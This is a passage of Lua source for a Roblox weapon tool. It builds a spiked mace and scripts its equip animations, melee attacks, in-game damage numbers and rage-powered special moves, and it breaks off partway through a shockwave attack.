handle = Part(Mo, false, false, 0, 0, "White", 0.4, 5, 0.4, true)
handle.Name = "Handle"
Instance.new("SpecialMesh",handle)
 
maintip = Part(Mo, false, false, 1, 0, "Bright yellow", 0.6, 0.5, 0.6, true)
Weld(handle, maintip, 0, -1.8, 0, 0, 0, 0)
 
DMGParts = {}
 
for i = 0, 135, 45 do
        local tip = Part(Mo, false, false, 0, 0, "Really black", 0.54, 1.3, 2.2, true)
        Instance.new("BlockMesh",tip)
        Weld(maintip, tip, 0, 0, 0, 0, 0, math.rad(i))
        table.insert(DMGParts, tip)
        for a = -0.9, 0.9, 1.8 do
                for x = 0, math.pi, math.pi do
                        local spike = Part(Mo, false, false, 0, 0, "Really black", 0.3, 0.5, 0.3, true)
                        local w = Weld(tip, spike, 0, 0, 0, 0, 0, 0)
                        w.C0 = CFrame.new(0, 0, a) * CFrame.Angles(x, 0, 0)
                        w.C1 = CFrame.new(0, -1, 0)
                        Add.Mesh(spike, "http://www.roblox.com/asset/?id=1033714", 0.14, 1, 0.14)
                        local trim = Part(Mo, false, false, 0, 0, "White", 0.67, 0.1, 0.5, true)
                        local w2 = Weld(tip, trim, 0, 0, 0, 0, 0, 0)
                        w2.C0 = CFrame.new(0, 0, a) * CFrame.Angles(x, 0, 0)
                        w2.C1 = CFrame.new(0, -0.58, 0)
                end
        end
end
 
spiketip = Part(Mo, false, false, 0, 0.2, "Really black", 0.3, 0.8, 0.3, true)
Weld(handle, spiketip, 0, -3.1, 0, 0, 0, 0)
Add.Mesh(spiketip, "http://www.roblox.com/asset/?id=1033714", 0.17, 2, 0.17)
 
table.insert(DMGParts, spiketip)
 
local handletip1 = Part(Mo, false, false, 0, 0.2, "White", 0.5, 0.5, 0.5, true)
local w1 = Weld(handle, handletip1, 0, 0, 0, 0, 0, 0)
w1.C0 = CFrame.new(0, -2.6, 0)
Add.Mesh(handletip1, "http://www.roblox.com/asset/?id=9756362", 0.85, 0.75, 0.85)
 
local handletip2 = Part(Mo, false, false, 0, 0.2, "Really black", 0.5, 0.5, 0.5, true)
Weld(handletip1, handletip2, 0, 0, 0, 0, math.rad(45), 0)
Add.Mesh(handletip2, "http://www.roblox.com/asset/?id=9756362", 0.95, 0.5, 0.95)
 
 
Mo.Parent = char
TH.Part1 = handle
 
function showdmg(dmg, p, pos)
        local mo = Instance.new("Model")
        mo.Name = dmg
        local pa = Part(mo, false, true, 0, 0, "White", 0.8, 0.3, 0.8, true)
        pa.CFrame = CFrame.new(p.Position) * CFrame.new(0, pos, 0)
        pa.Name = "Head"
        local hah = hc:clone()
        hah.Parent = mo
        local bp = Add.BP(pa)
        bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
        bp.position = p.Position + Vector3.new(0, 3+pos, 0)
        Add.BG(pa)
        coroutine.resume(coroutine.create(function()
                wait()
                mo.Parent = workspace
                wait(1.4)
                mo:remove()
        end))
end
 
 
function damage(hum, p, num, dm1, dm2)
        local dmg = math.random(dm1, dm2)
        hum.Health = hum.Health - dmg
        showdmg(dmg, p, num)
        return dmg
end
 
function brickdamage(hit)
        local h = getHumanoid(hit.Parent)
        if h ~= nil and Hurt and Deb then
                Deb = false
                local dmg = damage(h, maintip, 0, Prop.Damage/4, Prop.Damage)
                PlaySound(hitsound)
                Prop.Rage = math.floor(Prop.Rage + (dmg*Prop.RageIncome))
                wait(0.3)
                Deb = true
        end
end
 
function legdamage(hit)
        local h = getHumanoid(hit.Parent)
        if h ~= nil and Leghurt and LegDeb then
                LegDeb = false
                local dmg = damage(h, Rleg, 0, Prop.Legdmg/2, Prop.Legdmg)
                PlaySound(hitsound)
                Prop.Rage = math.floor(Prop.Rage + (dmg*Prop.RageIncome))
                coroutine.resume(coroutine.create(function()
                        local haha = math.random(1,3)
                        if haha == 1 then
                                h.PlatformStand = true
                                wait()
                                local ps = getAllParts(h.Parent)
                                for i, v in pairs(ps) do
                                        if v.Anchored == false then
                                                v.Velocity = CFrame.new(handle.Position, v.Position).lookVector * 40
                                                v.RotVelocity = Vector3.new(math.random(-30, 30), math.random(-30, 30), math.random(-30, 30))
                                        end
                                end
                                wait(0.8)
                                h.PlatformStand = false
                        end
                end))
                wait(0.2)
                LegDeb = true
        end
end
 
for i, v in pairs({Rleg, Lleg}) do
        v.Touched:connect(legdamage)
end
 
for i,v in pairs(DMGParts) do
        v.Touched:connect(brickdamage)
end
 
if script.Parent.className ~= "HopperBin" then
        h = Instance.new("HopperBin",me.Backpack)
        h.Name = Toolname
        h.TextureId = ToolIcon
        script.Parent = h
end
 
bin = script.Parent
 
function StartEffect(part)
        effectOn = true
        local lastPoint = part.Position
        coroutine.resume(coroutine.create(function()
                while effectOn do
                        wait()
                        local point = CFrame.new(lastPoint, part.Position) * CFrame.Angles(-math.pi/2, 0, 0)
                        local mag = (lastPoint - part.Position).magnitude
                        local p = Part(workspace, true, false, 0.1, 0, "Really black", 1, 1, 1, true)
                        local m = Instance.new("SpecialMesh",p)
                        p.CFrame = point * CFrame.new(0, mag/2, 0)
                        m.Scale = Vector3.new(1.2, mag+0.6, 1.2)
                        lastPoint = part.Position
                        coroutine.resume(coroutine.create(function() for i = 0.1, 1, 0.9/5 do wait() p.Transparency = i end p:remove() end))
                end
        end))
end
 
function EndEffect()
        effectOn = false
end
 
function detach(bool)
        LLW.C0 = CFrame.new(0, 0, 0)
        RLW.C0 = CFrame.new(0, 0, 0)
        LAW.C0 = CFrame.new(0,0,0)
        RAW.C0 = CFrame.new(0, 0, 0)
        if bool then
                LLW.Part1 = nil
                RLW.Part1 = nil
                RAW.Part1 = nil
                LAW.Part1 = nil
        end
end
 
function attach()
        RAW.Part1 = Rarm
        LAW.Part1 = Larm
        RLW.Part1 = Rleg
        LLW.Part1 = Lleg
end
 
function normal()
        neck.C0 = necko
        RAW.C0 = RAWStand
        LAW.C0 = LAWStand
        RLW.C0 = RLWStand
        LLW.C0 = LLWStand
        RAW.C1 = CFrame.new(0, 0.5, 0)
        LAW.C1 = CFrame.new(0, 0.5, 0)
        RLW.C1 = CFrame.new(0, 0.8, 0)
        LLW.C1 = CFrame.new(0, 0.8, 0)
        HW.C0 = HWStand
end
 
function idleanim()
        attach()
        for i = 0, 10, 10/22 do
                RAW.C0 = RAWStand * CFrame.Angles(0, math.rad(i), 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-i), 0, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(i/8), 0, math.rad(-i/6))
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-i/8), 0, math.rad(i/6))
                neck.C0 = necko * CFrame.Angles(math.rad(-i/2), 0, 0)
                if selected == false or torso.Velocity.magnitude > 2 or Able == false or RestingAnim == true then break end
                wait()
        end
        wait()
        for i = 10, 0, -10/29 do
                RAW.C0 = RAWStand * CFrame.Angles(0, math.rad(i), 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-i), 0, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(i/8), 0, math.rad(-i/6))
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-i/8), 0, math.rad(i/6))
                neck.C0 = necko * CFrame.Angles(math.rad(-i/2), 0, 0)
                if selected == false or torso.Velocity.magnitude > 2 or Able == false or RestingAnim == true then break end
                wait()
        end
        normal()
end
 
function runanim()
        RLW.Part1 = nil
        LLW.Part1 = nil
end
 
coroutine.resume(coroutine.create(function()
        while true do
                wait()
                if selected and Able == true and RestingAnim == false then
                        if torso.Velocity.magnitude < 2 then
                                idleanim()
                                wait()
                        else
                                runanim()
                                wait()
                        end
                end
        end
end))
 
function selectanim()
        if RestingAnim == false and Able == true then
        local ah = CFrame.Angles(0, 0, math.rad(90))
        RAW.Part1 = Rarm
        for i = 0, 270, 270/5 do
                RAW.C0 = CFrame.new(0, 0, -i/500) * CFrame.Angles(math.rad(i), math.rad(i/4), 0)
                neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-i/5))
                wait()
        end
        HW.C0 = ah
        HW.Part1 = handle
        TH.Part1 = nil
        PlaySound(equip)
        for i = 270, 70, -200/13 do
                RAW.C0 = CFrame.new(0, 0, -i/500) * CFrame.Angles(math.rad(i), math.rad(i/4), 0)
                neck.C0 = necko * CFrame.Angles(math.rad((i-270)/7), 0, math.rad(-i/5))
                wait()
        end
        attach()
        for i = 70, 120, 50/8 do
                local asd = i-70
                RAW.C0 = CFrame.new(-(i-70)/240, 0, -i/500) * CFrame.Angles(math.rad(70), math.rad(70/4+(i-70)), math.rad(-(i-70)/4))
                LAW.C0 = CFrame.Angles(math.rad(asd*1.5), 0, math.rad(asd/2)) * CFrame.new(asd/100, -asd/70, 0)
                HW.C0 = ah * CFrame.Angles(0, 0, math.rad(-asd*1.8))
                neck.C0 = necko * CFrame.Angles(math.rad(-200/7+(asd/2)), 0, math.rad(-70/5+(asd/5)))
                RLW.C0 = CFrame.Angles(0, 0, math.rad(asd/4))
                LLW.C0 = CFrame.Angles(0, 0, math.rad(-asd/4))
                wait()
        end
        if RAWStand == nil then
                RAWStand = RAW.C0
                LAWStand = LAW.C0
                RLWStand = RLW.C0
                LLWStand = LLW.C0
                HWStand = HW.C0
        end
        normal()
        end
end
 
function deselanim()
        if RestingAnim == false and Able == true then
        local ah = CFrame.Angles(0, 0, math.rad(90))
        for i = 120, 70, -50/8 do
                local asd = i-70
                RAW.C0 = CFrame.new(-(i-70)/240, 0, -i/500) * CFrame.Angles(math.rad(70), math.rad(70/4+(i-70)), math.rad(-(i-70)/4))
                LAW.C0 = CFrame.Angles(math.rad(asd*1.5), 0, math.rad(asd/2)) * CFrame.new(asd/100, -asd/70, 0)
                HW.C0 = ah * CFrame.Angles(0, 0, math.rad(-asd*1.8))
                neck.C0 = necko * CFrame.Angles(math.rad(-200/7+(asd/2)), 0, math.rad(-70/5+(asd/5)))
                RLW.C0 = CFrame.Angles(0, 0, math.rad(asd/4))
                LLW.C0 = CFrame.Angles(0, 0, math.rad(-asd/4))
                wait()
        end
        LLW.Part1 = nil
        RLW.Part1 = nil
        LAW.Part1 = nil
        for i = 70, 270, 200/13 do
                RAW.C0 = CFrame.new(0, 0, -i/500) * CFrame.Angles(math.rad(i), math.rad(i/4), 0)
                neck.C0 = necko * CFrame.Angles(math.rad((i-270)/7), 0, math.rad(-i/5))
                wait()
        end
        HW.C0 = ah
        HW.Part1 = nil
        TH.Part1 = handle
        for i = 270, 0, -270/6 do
                RAW.C0 = CFrame.new(0, 0, -i/500) * CFrame.Angles(math.rad(i), math.rad(i/4), 0)
                neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-i/5))
                wait()
        end
        neck.C0 = necko
        detach(true)
        end
end
 
function smash(mouse)
        attach()
        local mouseHit = mouse
        local Orig = torso.CFrame
        local bg = Add.BG(torso)
        local bp = Add.BP(torso)
        bp.position = Orig.p
        local CF = ComputePos(Orig.p, mouseHit)
        local CF2 = CF
        bg.cframe = CF2
        PlaySound(slash)
        for i = 0, 1, Prop.AS*1.1 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(80*i), 0, math.rad(45*i)) * CFrame.new(0, -0.4*i, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(75*i), 0, math.rad(40*i)) * CFrame.new(0, -0.5*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(20*i), math.rad(16*i), math.rad(-8*i))
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-30*i), math.rad(-16*i), math.rad(8*i))
                HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(30*i))
                neck.C0 = necko * CFrame.Angles(math.rad(-35*i), 0, math.rad(-10*i))
                wait()
        end
        bp.position = CF * CFrame.new(0, 0, -1.1).p
        StartEffect(maintip)
        Hurt = true
        for i = 0, 1, Prop.AS*1.5 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(70-150*i), math.rad(-45*i), math.rad(45-140*i)) * CFrame.new(0, -0.4, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(75-180*i), math.rad(80*i), math.rad(40-20*i)) * CFrame.new(0, -0.5, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(20-50*i), math.rad(16-16*i), math.rad(-8+8*i))
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-30+40*i), math.rad(-16+16*i), math.rad(8-8*i))
                HW.C0 = HWStand * CFrame.Angles(math.rad(-48*i), 0, math.rad(30))
                neck.C0 = necko * CFrame.Angles(math.rad(-35+75*i), 0, math.rad(-10+26*i))
                wait()
        end
        Hurt = false
        EndEffect()
        PlaySound(smashsound)
        bp.position = CF * CFrame.new(0, 0, -1.9).p
        for i = 0, 1, Prop.AS do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(70-150+80*i), math.rad(-45+45*i), math.rad(45-140+95*i)) * CFrame.new(0, -0.4+0.4*i, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(75-180+105*i), math.rad(80-80*i), math.rad(20-20*i)) * CFrame.new(0, -0.5+0.5*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(20-50+30*i), 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-30+40-10*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(math.rad(-48+48*i), 0, math.rad(30-30*i))
                neck.C0 = necko * CFrame.Angles(math.rad(-35+75-40*i), 0, math.rad(-10+26-16*i))
                wait()
        end
        normal()
        bg:remove()
        bp:remove()
end
 
function swing(mouse)
        attach()
        local mouseHit = mouse
        local Orig = torso.CFrame
        local bg = Add.BG(torso)
        local bp = Add.BP(torso)
        bp.position = Orig.p
        local CF = ComputePos(Orig.p, mouseHit)
        local CF2 = CF
        bg.cframe = CF2
        PlaySound(slash)
        for i = 0, 1, Prop.AS*1.5 do
                RAW.C0 = RAWStand * CFrame.Angles(0, math.rad(-140*i), 0) * CFrame.new(0, 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(25*i), 0, math.rad(20*i)) * CFrame.new(0, -0.4*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(20*i), 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-10*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, math.rad(-10*i), 0)
                neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-50*i))
                bg.cframe = CF2 * CFrame.Angles(0, math.rad(-40*i), 0)
                wait()
        end
        Hurt = true
        StartEffect(maintip)
        for i = 0, 1, Prop.AS*1.3 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(70*i), math.rad(-140), 0) * CFrame.new(0, -0.9*i, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(25), 0, math.rad(20-100*i)) * CFrame.new(0, -0.4+0.6*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(20), 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-10), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(math.rad(-70*i), math.rad(-15), 0) * CFrame.new(0, 0, -0.9*i)
                neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-50+90*i))
                bg.cframe = CF2 * CFrame.Angles(0, math.rad(-40+80*i), 0)
                wait()
        end
        EndEffect()
        Hurt = false
        for i = 0, 1, Prop.AS*0.8 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(70-70*i), math.rad(-140+140*i), 0) * CFrame.new(0, -0.9+0.9*i, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(25-25*i), 0, math.rad(20-100+80*i)) * CFrame.new(0, -0.4+0.6-0.2*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(20-20*i), 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-10+10*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(math.rad(-70+70*i), math.rad(-15+15*i), 0) * CFrame.new(0, 0, -0.9+0.9*i)
                neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-50+90-40*i))
                bg.cframe = CF2 * CFrame.Angles(0, math.rad(40-40*i), 0)
                wait()
        end
        normal()
        bg:remove()
        bp:remove()
end
 
function stab(mouse)
        attach()
        local mouseHit = mouse
        local Orig = torso.CFrame
        local bg = Add.BG(torso)
        local bp = Add.BP(torso)
        bp.position = Orig.p
        local CF = ComputePos(Orig.p, mouseHit)
        local CF2 = CF
        bg.cframe = CF2
        PlaySound(slash)
        for i = 0, 1, Prop.AS do
                RAW.C0 = RAWStand * CFrame.new(0, 0.6*i, 0) * CFrame.Angles(math.rad(-60*i), math.rad(-40*i), math.rad(-30*i)) * CFrame.new(-0.45*i, 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-50*i), 0, math.rad(40*i)) * CFrame.new(0, -0.6*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(3*i), math.rad(20*i), math.rad(-10*i))
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-3*i), math.rad(-20*i), math.rad(10*i))
                HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 1*i)
                neck.C0 = necko * CFrame.Angles(math.rad(25*i), 0, math.rad(-45*i))
                bg.cframe = CF2 * CFrame.Angles(0, math.rad(-30*i), 0)
                wait()
        end
        StartEffect(maintip)
        Hurt = true
        bp.position = CF * CFrame.new(0, 0, -0.6).p
        for i = 0, 1, Prop.AS*1.5 do
                RAW.C0 = RAWStand * CFrame.new(0, 0.6-0.8*i, 0) * CFrame.Angles(math.rad(-60+100*i), math.rad(-40), math.rad(-30+70*i)) * CFrame.new(-0.45, 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-50+60*i), 0, math.rad(40-30*i)) * CFrame.new(0, -0.6-0.4*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(3-18*i), math.rad(20-40*i), math.rad(-10+20*i))
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-3+18*i), math.rad(-20+40*i), math.rad(10-20*i))
                HW.C0 = HWStand * CFrame.Angles(math.rad(-70*i), 0, 0) * CFrame.new(0, 0, 1-1.4*i)
                neck.C0 = necko * CFrame.Angles(math.rad(25-20*i), 0, math.rad(-45+35*i))
                bg.cframe = CF2 * CFrame.Angles(0, math.rad(-30+45*i), 0)
                wait()
        end
        Hurt = false
        EndEffect()
        bp.position = CF.p
        for i = 0, 1, Prop.AS*1.1 do
                RAW.C0 = RAWStand * CFrame.new(0, 0.6-0.8+0.2*i, 0) * CFrame.Angles(math.rad(-60+100-40*i), math.rad(-40+40*i), math.rad(-30+70-40*i)) * CFrame.new(-0.45+0.45*i, 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-50+60-10*i), 0, math.rad(40-30-10*i)) * CFrame.new(0, -0.6-0.4+1*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(3-18+15*i), math.rad(20-40+20*i), math.rad(-10+20-10*i))
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-3+18-15*i), math.rad(-20+40-20*i), math.rad(10-20+10*i))
                HW.C0 = HWStand * CFrame.Angles(math.rad(-70+70*i), 0, 0) * CFrame.new(0, 0, 1-1.4+0.4*i)
                neck.C0 = necko * CFrame.Angles(math.rad(5-5*i), 0, math.rad(-10+10*i))
                bg.cframe = CF2 * CFrame.Angles(0, math.rad(-30+45-15*i), 0)
                wait()
        end
        normal()
        bg:remove()
        bp:remove()
end
 
function epicsmashfunc(hit)
        local ch = hit.Parent
        local h = getHumanoid(ch)
        local t, head = ch:findFirstChild("Torso"), ch:findFirstChild("Head")
        return h, t, head
end
 
function epicsmash(mouse)
        if Prop.Rage >= 50 then
        attach()
        local mouseHit = mouse
        local Orig = torso.CFrame
        local bg = Add.BG(torso)
        local bp = Add.BP(torso)
        bp.position = Orig.p
        local CF = ComputePos(Orig.p, mouseHit)
        bg.cframe = CF
        local hu, to, head = nil, nil, nil
        local Epic = true
        local conn = Lleg.Touched:connect(function(hit)
                if Epic then
                        hu, to, head = epicsmashfunc(hit)
                        if hu and to and head then Epic = false end
                end
        end)
        PlaySound(slash)
        for i = 0, 1, 0.12 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-160*i), math.rad(-30*i), math.rad(-80*i)) * CFrame.new(0, 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-80*i), 0, math.rad(-70*i)) * CFrame.new(0, -0.4*i, 0.6*i)
                RLW.C0 = RLWStand * CFrame.Angles(0, 0, math.rad(20*i)) * CFrame.new(0, 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(115*i), 0, math.rad(-40*i)) * CFrame.new(0, -0.8*i, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 2*i)
                neck.C0 = necko * CFrame.Angles(0, 0, math.rad(52*i))
                bg.cframe = CF * CFrame.Angles(math.rad(10*i), math.rad(-45*i), math.rad(-15*i))
                wait()
        end
        conn:disconnect()
        if hu and to and head then
                Prop.Rage = Prop.Rage - 50
                hu.PlatformStand = true
                local bg2 = Add.BG(to)
                bg2.P = 6000
                bg2.cframe = CF * CFrame.Angles(math.rad(90), math.rad(180), math.rad(90))
                local bp2 = Add.BP(to)
                bp2.position = CF * CFrame.new(-1, -4, -4).p
                bp2.P = 5000
                wait(0.1)
                for i = 0, 1, 0.045 do
                        RAW.C0 = RAWStand * CFrame.Angles(math.rad(-160+270*i), math.rad(-30+20*i), math.rad(-80+120*i))
                        LAW.C0 = LAWStand * CFrame.Angles(math.rad(-80+140*i), 0, math.rad(-70+120*i)) * CFrame.new(0, -0.4-0.1*i, 0.6-0.6*i)
                        RLW.C0 = RLWStand * CFrame.Angles(0, 0, math.rad(20-20*i)) * CFrame.new(0, 0, 0)
                        LLW.C0 = LLWStand * CFrame.Angles(math.rad(115-115*i), 0, math.rad(-40+40*i)) * CFrame.new(0, -0.8+0.8*i, 0)
                        HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 2-2*i)
                        neck.C0 = necko * CFrame.Angles(0, 0, math.rad(52-37*i))
                        bg.cframe = CF * CFrame.Angles(math.rad(10-10*i), math.rad(-45+35*i), math.rad(-15+15*i))
                        wait()
                end
                PlaySound(slash)
                bp2:remove()
                bg2:remove()
                wait(0.2)
                StartEffect(maintip)
                for i = 0, 1, 0.1 do
                        RAW.C0 = RAWStand * CFrame.Angles(math.rad(-160+270-190*i), math.rad(-30+20-35*i), math.rad(-80+120-135*i))
                        LAW.C0 = LAWStand * CFrame.Angles(math.rad(-80+140-150*i), math.rad(60*i), math.rad(-70+120-40*i)) * CFrame.new(0, -0.4-0.1, 0)
                        RLW.C0 = RLWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0)
                        LLW.C0 = LLWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0)
                        HW.C0 = HWStand * CFrame.Angles(math.rad(-55*i), 0, math.rad(30*i)) * CFrame.new(0, 0, -1*i)
                        neck.C0 = necko * CFrame.Angles(0, 0, math.rad(52-37+30*i))
                        bg.cframe = CF * CFrame.Angles(math.rad(10-10), math.rad(-45+35-30*i), math.rad(-15+15))
                        wait()
                end
                coroutine.resume(coroutine.create(function()
                        local frr = Cam.CoordinateFrame
                        for i = 1, math.random(3,6) do
                                wait()
                                Cam.CoordinateFrame = frr * CFrame.new(math.random(-6,6)/10, math.random(-6,6)/10, math.random(-6,6)/10)
                        end
                end))
                PlaySound(smashsound)
                EndEffect()
                local pos = head.Position
                if (pos - maintip.Position).magnitude < 2 then
                damage(hu, head, 0.3, hu.Health, hu.Health)
                head:remove()
                PlaySound(hitsound)
                for i = 1, math.random(7, 17) do
                        local hmm = math.random(1,6)
                        if hmm < 6 then
                                local cols = {"White", "Really red"}
                                local p = Part(workspace, false, false, 0, 0, cols[math.random(1,#cols)], math.random(2,10)/10, 0.2, math.random(2,10)/10)
                                p.CFrame = CFrame.new(pos) * CFrame.new(math.random(-6,6)/10, math.random(-4,2)/10, math.random(-6, 6)/10)
                                p.Velocity = Vector3.new(math.random(-15, 15), math.random(5, 40), math.random(-15, 15))
                                p.RotVelocity = Vector3.new(math.random(-25,25), math.random(-25,25), math.random(-25,25))
                        else
                                local cols = {"Institutional white", "White"}
                                local p = Part(workspace, false, false, 0, 0, cols[math.random(1,#cols)], math.random(4,13)/10, 0.3, math.random(2,3)/10)
                                p.CFrame = CFrame.new(pos) * CFrame.new(math.random(-6,6)/10, math.random(-4,2)/10, math.random(-6, 6)/10)
                                p.Velocity = Vector3.new(math.random(-15, 15), math.random(5, 40), math.random(-15, 15))
                                p.RotVelocity = Vector3.new(math.random(-25,25), math.random(-25,25), math.random(-25,25))
                        end
                end
                end
                for i = 0, 1, 0.06 do
                        RAW.C0 = RAWStand * CFrame.Angles(math.rad(-160+270-190+80*i), math.rad(-30+20-35+45*i), math.rad(-80+120-135+95*i))
                        LAW.C0 = LAWStand * CFrame.Angles(math.rad(-80+140-150+90*i), math.rad(60-60*i), math.rad(10-10*i)) * CFrame.new(0, -0.4-0.1+0.5*i, 0)
                        RLW.C0 = RLWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0)
                        LLW.C0 = LLWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0)
                        HW.C0 = HWStand * CFrame.Angles(math.rad(-55+55*i), 0, math.rad(30-30*i)) * CFrame.new(0, 0, -1+1*i)
                        neck.C0 = necko * CFrame.Angles(0, 0, math.rad(45-45*i))
                        bg.cframe = CF * CFrame.Angles(0, math.rad(-45+35-20+30*i), 0)
                        wait()
                end
        else
                for i = 0, 1, 0.08 do
                        RAW.C0 = RAWStand * CFrame.Angles(math.rad(-160+160*i), math.rad(-30+30*i), math.rad(-80+80*i)) * CFrame.new(0, 0, 0)
                        LAW.C0 = LAWStand * CFrame.Angles(math.rad(-80+80*i), 0, math.rad(-70+70*i)) * CFrame.new(0, -0.4+0.4*i, 0.6-0.6*i)
                        RLW.C0 = RLWStand * CFrame.Angles(0, 0, math.rad(20-20*i)) * CFrame.new(0, 0, 0)
                        LLW.C0 = LLWStand * CFrame.Angles(math.rad(115-115*i), 0, math.rad(-40+40*i)) * CFrame.new(0, -0.8+0.8*i, 0)
                        HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 2-2*i)
                        neck.C0 = necko * CFrame.Angles(0, 0, math.rad(52-52*i))
                        bg.cframe = CF * CFrame.Angles(math.rad(10-10*i), math.rad(-45+45*i), math.rad(-15+15*i))
                        wait()
                end
                bg:remove()
                bp:remove()
                normal()
        end
        normal()
        bg:remove()
        bp:remove()
        end
end
 
 
function shockwave(mouse)
        local p, t = RayCast(torso.Position, torso.CFrame * CFrame.new(0, -5, 0).p, 5, 1)
        if Prop.Rage >= 80 and t then
        Prop.Rage = Prop.Rage - 80
        attach()
        local mouseHit = mouse
        local Orig = torso.CFrame
        local bg = Add.BG(torso)
        local bp = Add.BP(torso)
        bp.position = Orig.p
        bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
        bp.P = 5000
        local CF = ComputePos(Orig.p, mouseHit)
        bg.cframe = CF
        PlaySound(charge)
        for i = 0, 1, 0.07 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-110*i), math.rad(-40*i), math.rad(-50*i)) * CFrame.new(0.2*i, 0, 0.2*i)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-100*i), 0, math.rad(-40*i)) * CFrame.new(-0.2*i, -0.4*i, 0.5*i)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(15*i), 0, math.rad(-10*i)) * CFrame.new(0, 0.7*i, -0.8*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-75*i), 0, math.rad(10*i)) * CFrame.new(0, 0.4*i, 0.2*i)
                HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 1.6*i)
                neck.C0 = necko * CFrame.Angles(math.rad(30*i), 0, 0)
                bg.cframe = CF * CFrame.Angles(0, 0, 0)
                bp.position = Orig.p + Vector3.new(0, -1.9*i, 0)
                wait()
        end
        for i = 0, 1, 0.04 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-110+220*i), math.rad(-40+50*i), math.rad(-50+90*i)) * CFrame.new(0.2-0.2*i, -0.85*i, 0.2-0.2*i)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-100+185*i), 0, math.rad(-40+75*i)) * CFrame.new(-0.2-0.2*i, -0.4-0.05*i, 0.5-0.5*i)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(15-25*i), 0, math.rad(-10+6*i)) * CFrame.new(0, 0.7-0.7*i, -0.8+0.8*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-75+65*i), 0, math.rad(10-6*i)) * CFrame.new(0, 0.4-0.4*i, 0.2-0.2*i)
                HW.C0 = HWStand * CFrame.Angles(math.rad(-15*i), 0, 0) * CFrame.new(0, 0, 1.6-2.1*i)
                neck.C0 = necko * CFrame.Angles(math.rad(30-70*i), 0, 0)
                bg.cframe = CF * CFrame.Angles(0, 0, 0)
                bp.position = Orig.p + Vector3.new(0, -1.9+17*i, 0)
                wait()
        end
        bp.P = 12001
        wait(0.1)
        StartEffect(maintip)
        PlaySound(slash)
        for i = 0, 1, 0.1 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(110-150*i), math.rad(10-30*i), math.rad(40-90*i)) * CFrame.new(0, -0.85+0.85*i, -0.8*i)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(85-125*i), 0, math.rad(35)) * CFrame.new(0, -0.45+0.1, 0)
